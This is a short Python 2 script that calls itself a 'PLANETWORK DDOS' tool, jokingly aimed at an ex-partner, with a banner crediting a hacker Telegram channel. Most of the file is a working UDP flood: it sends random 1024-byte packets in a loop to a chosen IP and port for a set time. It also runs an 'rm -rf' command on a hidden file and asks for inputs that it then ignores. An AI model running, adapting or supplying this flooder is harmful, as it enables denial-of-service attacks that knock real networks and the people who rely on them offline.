"""PLANETWORK DDOS
Tool untuk melakukan pengiriman packet kepada mantan terindah :'v """
import time
import socket
import random
import sys
import os
try:
	os.remove(".dddd92.py")
except:
	pass


os.system("rm -rf .dddd92.py")
os.system("clear")

print("""
	
d8888b. d8888b.  .d88b.  .d8888. 
88  `8D 88  `8D .8P  Y8. 88'  YP 
88   88 88   88 88    88 `8bo.   
88   88 88   88 88    88   `Y8b. 
88  .8D 88  .8D `8b  d8' db   8D 
Y8888D' Y8888D'  `Y88P'  `8888Y' 
                                 
                                 

\033[1;97m--------------------------------------------------	
\033[1;97mAuther : Hama Z.w
\033[1;97mTelegram Channel : @kurdhacker_hama_bn_dlaj
\033[1;97mTelegram Group : @kurdhackerzw
\033[1;97mGithub : https://github.com/533hacker
\033[1;97mThis Tool DDos Wifi
\033[1;97m--------------------------------------------------
""")


ip = raw_input("ip:")
port = raw_input("port:")
packet = raw_input("packet:")




def usage():
    print "Command: " + sys.argv[0] + " <ip> <port> <packet>"

def flood(victim, vport, duration):
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 representes one byte to the server
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "Attacking %s sent packages %s at the port %s "%(sent, victim, vport)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
